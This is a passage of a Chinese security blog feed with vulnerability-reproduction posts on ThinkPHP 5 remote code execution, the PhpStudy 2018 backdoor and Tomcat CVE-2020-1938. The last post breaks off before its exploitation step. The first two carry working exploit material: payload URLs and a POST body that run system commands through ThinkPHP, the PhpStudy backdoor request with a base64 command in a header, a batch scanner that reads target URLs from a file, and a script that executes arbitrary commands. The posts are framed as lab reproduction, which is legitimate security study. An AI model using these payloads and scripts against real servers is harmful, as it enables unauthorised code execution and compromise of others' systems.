    <link href="http://yoursite.com/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/"/>
    <id>http://yoursite.com/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/</id>
    <published>2020-06-09T12:07:00.000Z</published>
    <updated>2020-06-09T13:38:47.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ThinkPHP-5-0-10-环境框架搭建"><a href="#ThinkPHP-5-0-10-环境框架搭建" class="headerlink" title="ThinkPHP 5.0.10 环境框架搭建"></a>ThinkPHP 5.0.10 环境框架搭建</h2><p>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。</p><a id="more"></a><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/1.png" alt><br>查看当前版本<br><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/2.png" alt><br>环境搭建成功</p><h2 id="缓存类导致RCE"><a href="#缓存类导致RCE" class="headerlink" title="缓存类导致RCE"></a>缓存类导致RCE</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h3><p><strong>漏洞利用条件</strong></p><ol><li>基于tp5开发的代码中使用了Cache::set 进行缓存</li><li>在利用版本范围内</li><li>runtime目录可以访问</li></ol><p>创建一个生成缓存的页面<br><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/3.png" alt><br>构造payload如下：</p><blockquote><p><a href="http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//" target="_blank" rel="noopener">http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//</a></p></blockquote><p>成功在缓存文件写入payload</p><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/4.png" alt></p><blockquote><p><a href="http://127.0.0.1/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php?_=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php?_=phpinfo()</a>;</p></blockquote><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/5.png" alt></p><p>成功执行代码</p><h2 id="未开启强制路由导致rce"><a href="#未开启强制路由导致rce" class="headerlink" title="未开启强制路由导致rce"></a>未开启强制路由导致rce</h2><h3 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload-1"><a href="#测试payload-1" class="headerlink" title="测试payload"></a>测试payload</h3><blockquote><p>5.1.x ：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><blockquote><p>5.0.x ：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username # 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><p>当前环境版本是5.0.10，构造payload如下：</p><blockquote><p><a href="http://127.0.0.1/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami" target="_blank" rel="noopener">http://127.0.0.1/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a></p></blockquote><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/6.png" alt><br>成功执行代码</p><h2 id="method任意调用方法导致rce"><a href="#method任意调用方法导致rce" class="headerlink" title="method任意调用方法导致rce"></a>method任意调用方法导致rce</h2><h3 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload-2"><a href="#测试payload-2" class="headerlink" title="测试payload"></a>测试payload</h3><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;index HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/7.png" alt><br>成功执行代码</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7792#toc-0" target="_blank" rel="noopener">Thinkphp5 RCE总结</a><br><a href="https://y4er.com/post/thinkphp5-rce" target="_blank" rel="noopener">Thinkphp5 代码执行学习</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ThinkPHP-5-0-10-环境框架搭建&quot;&gt;&lt;a href=&quot;#ThinkPHP-5-0-10-环境框架搭建&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5.0.10 环境框架搭建&quot;&gt;&lt;/a&gt;ThinkPHP 5.0.10 环境框架搭建&lt;/h2&gt;&lt;p&gt;ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="ThinkPHP 5" scheme="http://yoursite.com/tags/ThinkPHP-5/"/>
    
      <category term="ThinkPHP" scheme="http://yoursite.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>PhpStudy2018后门漏洞预警及漏洞复现&amp;检测和执行POC脚本</title>
    <link href="http://yoursite.com/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/</id>
    <published>2020-06-03T09:44:51.000Z</published>
    <updated>2020-06-09T12:50:27.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpstudy介绍"><a href="#phpstudy介绍" class="headerlink" title="phpstudy介绍"></a>phpstudy介绍</h2><p>Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户</p><h2 id="后门事件"><a href="#后门事件" class="headerlink" title="后门事件"></a>后门事件</h2><p>2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。<br>于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>目前已知受影响的phpstudy版本<br>phpstudy 2016版php-5.4<br>phpstudy 2018版php-5.2.17<br>phpstudy 2018版php-5.4.45</p><h2 id="后门检测分析"><a href="#后门检测分析" class="headerlink" title="后门检测分析"></a>后门检测分析</h2><p>通过分析，后门代码存在于\ext\php_xmlrpc.dll模块中<br>phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45<br>phpStudy2016路径<br><code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>php\php-5.4.45\ext\php_xmlrpc.dll</code><br>phpStudy2018路径<br><code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code><br>用notepad打开此文件查找@eval，文件存在<code>@eval(%s(‘%s’))</code>证明漏洞存在，如图：<br><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/1.png" alt></p><h2 id="phpstudy-2018漏洞复现"><a href="#phpstudy-2018漏洞复现" class="headerlink" title="phpstudy 2018漏洞复现"></a>phpstudy 2018漏洞复现</h2><p>启动phpstudy，选择php-5.2.17版本，使用burpsuit抓包（如果是本机127.0.0.1环境，代理去掉本地过滤，否则抓不到包）。</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/2.png" alt></p><p>大佬给出exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: yourip.com</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.25 Safari&#x2F;537.36 Core&#x2F;1.70.3730.400 QQBrowser&#x2F;10.5.3805.400</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset:这里就是你要执行的代码命令（经过base64加密）</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>我们修改数据包查看命令<code>phpinfo();</code>执行情况</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/3.png" alt></p><p>继续修改数据包查看命令<code>echo system(&quot;net user&quot;);</code>执行情况</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/4.png" alt></p><p>漏洞复现成功<br>ps：我复现的时候这里有一个坑，就是直接repeater过来的数据包<code>Accept-Encoding</code>字段的参数是<code>gzip, deflate</code>,<code>deflate</code>前面有一个空格，去掉就可以成功执行命令了</p><h2 id="后门检测脚本"><a href="#后门检测脚本" class="headerlink" title="后门检测脚本"></a>后门检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_read</span><span class="params">(file_name=<span class="string">"url.txt"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(file_name, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> [i.replace(<span class="string">"\n"</span>, <span class="string">""</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    if "http://" or "https://" not in url:</span></span><br><span class="line"><span class="string">        url = "https://" + url</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">        <span class="string">'accept-charset'</span>: <span class="string">'ZWNobyBlZVN6eHU5Mm5JREFiOw=='</span>,  <span class="comment"># 输出 eeSzxu92nIDAb</span></span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = rq.get(url, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> res.text.find(<span class="string">'eeSzxu92nIDAb'</span>):</span><br><span class="line">                print(<span class="string">"[存在漏洞] "</span> + url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[超时] "</span> + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"phpStudy 批量检测 (需要 gevent,requests 库)"</span>)</span><br><span class="line">    print(<span class="string">"使用之前，请将URL保存为 url.txt 放置此程序同目录下"</span>)</span><br><span class="line">    input(<span class="string">"任意按键开始执行.."</span>)</span><br><span class="line">    tasks = [gevent.spawn(check, url) <span class="keyword">for</span> url <span class="keyword">in</span> file_read()]</span><br><span class="line">    print(<span class="string">"正在执行...请等候"</span>)</span><br><span class="line">    gevent.joinall(tasks)</span><br><span class="line">    wait = input(<span class="string">"执行完毕 任意键退出..."</span>)</span><br></pre></td></tr></table></figure><h2 id="后门执行脚本"><a href="#后门执行脚本" class="headerlink" title="后门执行脚本"></a>后门执行脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">(url, command=<span class="string">"system('calc.exe');"</span>)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">        <span class="string">'accept-charset'</span>: <span class="string">'c3lzdGVtKCdjYWxjLmV4ZScpOw=='</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    command = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="string">"200"</span>:</span><br><span class="line">        print(<span class="string">"执行完成"</span>)</span><br><span class="line">    a = input(<span class="string">"任意键退出..."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(<span class="string">"输入URL(例如:http://127.0.0.1:228/xx.php)\n"</span>)</span><br><span class="line">command = input(<span class="string">"输入命令 默认为 system('calc.exe'); (不想输入直接回车)\n"</span>)</span><br><span class="line">backdoor(url, command)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>PhpStudyGhost后门供应链攻击事件及相关IOC<br><a href="https://www.freebuf.com/column/214946.html" target="_blank" rel="noopener">https://www.freebuf.com/column/214946.html</a><br>PHPStudy后门分析+复现&amp;附批量Py脚本<br><a href="https://mp.weixin.qq.com/s/Y29wifB6XTDcJN-RPDMwxg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Y29wifB6XTDcJN-RPDMwxg</a><br>phpstudy后门文件分析以及检测脚本<br><a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw</a><br>Phpstudy官网于2016年被入侵，犯罪分子篡改软件并植入后门<br><a href="https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw</a><br>phpstudy后门文件分析以及检测脚本<br><a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw</a><br>phpStudy隐藏后门预警<br><a href="https://www.cnblogs.com/0daybug/p/11571119.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11571119.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;phpstudy介绍&quot;&gt;&lt;a href=&quot;#phpstudy介绍&quot; class=&quot;headerlink&quot; title=&quot;phpstudy介绍&quot;&gt;&lt;/a&gt;phpstudy介绍&lt;/h2&gt;&lt;p&gt;Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户&lt;/p&gt;
&lt;h2 id=&quot;后门事件&quot;&gt;&lt;a href=&quot;#后门事件&quot; class=&quot;headerlink&quot; title=&quot;后门事件&quot;&gt;&lt;/a&gt;后门事件&lt;/h2&gt;&lt;p&gt;2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。&lt;br&gt;于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="POC" scheme="http://yoursite.com/tags/POC/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="后门" scheme="http://yoursite.com/tags/%E5%90%8E%E9%97%A8/"/>
    
      <category term="PhpStudy2018" scheme="http://yoursite.com/tags/PhpStudy2018/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含漏洞的搭建与复现：CVE-2020-1938</title>
    <link href="http://yoursite.com/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/"/>
    <id>http://yoursite.com/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/</id>
    <published>2020-06-03T09:44:51.000Z</published>
    <updated>2020-06-03T11:04:02.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件,如：webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。</p><p>Apache Tomcat都是Apache开源组织开发的用于处理HTTP服务的免费项目，可以作为独立的Web服务器运行。Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，所以本次通告的漏洞影响范围较大，请相关用户及时采取防护措施或者升级补丁修复此漏洞。</p><a id="more"></a><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="不受影响版本"><a href="#不受影响版本" class="headerlink" title="不受影响版本"></a>不受影响版本</h3><ul><li>Apache Tomcat = 7.0.100</li><li>Apache Tomcat = 8.5.51</li><li>Apache Tomcat = 9.0.31</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ul><li><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">Apache Tomcat 8.0.39</a></li><li><a href="https://github.com/hypn0s/AJPy" target="_blank" rel="noopener">AJPy-master</a></li><li><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">CNVD-2020-10487-Tomcat-Ajp-lfi-master</a></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先成功搭建tomcat环境：<br><img 